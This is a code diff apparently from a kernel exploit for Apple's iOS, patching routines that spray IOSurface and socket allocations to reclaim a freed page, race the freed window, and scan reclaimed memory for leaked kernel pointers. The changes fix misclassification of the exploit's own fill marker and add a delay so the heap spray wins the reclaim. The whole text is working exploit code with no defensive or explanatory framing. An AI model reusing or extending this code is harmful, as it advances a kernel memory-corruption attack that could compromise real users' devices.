@@ -429,6 +429,10 @@ static int g_rcUntagged = 0;      /* v3 spray-tag knob (bandit arm "untagged") *
    anchor exactly like M0_TAG — an anchor-tagged window is a geometry
    measurement of our own pages, NEVER a FOREIGN/kptr claim. */
 static uint64_t g_rcAnchor = 0;   /* g_rcAnchors/g_rcAnchorN live above rc_is_own_anchor */
+static uint64_t g_rcFill = 0;     /* 2026-11-19 cls bug: the ACTUAL m0 fill (anchor or hmarker).
+                                     rc_cls/rc_aim must recognize it — the 22:02 receipt had 4
+                                     FOREIGN windows with content=0/KPTR=0: every one was our own
+                                     hmarker fill misclassified because rc_cls only checked M0_TAG. */
 static BOOL g_rcBanditInit = NO;  /* one-shot cscali domain registration */
 static NSMutableString *g_rc_log_str = nil;
 
@@ -587,6 +591,7 @@ static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
         uint64_t q = rbBuf[qi];
         if (q == hmarker) continue;
         if (rc_is_own_anchor(q)) continue;   /* own m0 fill — not a kptr */
+        if (g_rcFill && q == g_rcFill) continue;   /* the actual fill — not a kptr */
         if (q == 0) { zro++; continue; }
         if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
             q >= 0xfffffe0000000000ull) {
@@ -612,6 +617,7 @@ static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
                 uint64_t q = wq8[qi];
                 if (q == 0) continue;
                 if (rc_is_own_anchor(q)) continue;   /* own m0 fill — not a kptr */
+                if (g_rcFill && q == g_rcFill) continue;   /* the actual fill */
                 wcont++;
                 if (wfirst == 0) wfirst = q;
                 if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
@@ -640,6 +646,7 @@ static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
        never FOREIGN, even though the value is kptr-shaped (it is a REAL
        leaked heap address, but the page is ours). */
     if (rc_is_own_anchor(first)) return C_M0;
+    if (g_rcFill && first == g_rcFill) return C_M0;   /* the ACTUAL fill — the 22:02 phantom-FOREIGN fix */
     if ((first & 0xFFFFFFFF00000000ULL) == PAGE_TAG_BASE) {
         uint32_t idx = (uint32_t)first;
         if (idx == expected) return C_CORRECT;
@@ -762,6 +769,7 @@ static CFNumberRef RCNUM(int64_t v) {
         g_rcAnchor = g_rcAnchorN ? g_rcAnchors[0] : 0;
         m0 = g_rcAnchor ? g_rcAnchor : hmarker;
         g_rcUntagged = (g_rcAnchor == 0);   /* bandit-arm bookkeeping only */
+        g_rcFill = m0;   /* the actual fill for rc_cls/rc_aim (the phantom-FOREIGN fix) */
         if (g_rcAnchorN > 1)
             rc_log("[anchor] multi set: %d distinct — m0=%#llx reclaim-vpat=%#llx",
                    g_rcAnchorN, g_rcAnchor, g_rcAnchors[1]);
@@ -1637,6 +1645,12 @@ static CFNumberRef RCNUM(int64_t v) {
             if (pPrefetch) pPrefetch(s14);   /* v12.2 move: pin the window */
             /* free exactly this window — nothing of ours is in flight */
             CFRelease(s14);
+            /* 2026-11-19: give the IOSurface+socket churners TIME to draw
+               the freed page (the 22:02 receipt: cycles=24 across all 8
+               windows = 75ms total — the churn barely ran before the
+               re-race consumed the window). 100ms per window = ~400
+               surface cycles + ~200 socket batches competing for it. */
+            usleep(100000);
             /* step 2: the freed page goes to the NEXT allocator, not to a
                purge-queue wedge */
             uint32_t sprayGot = 0;
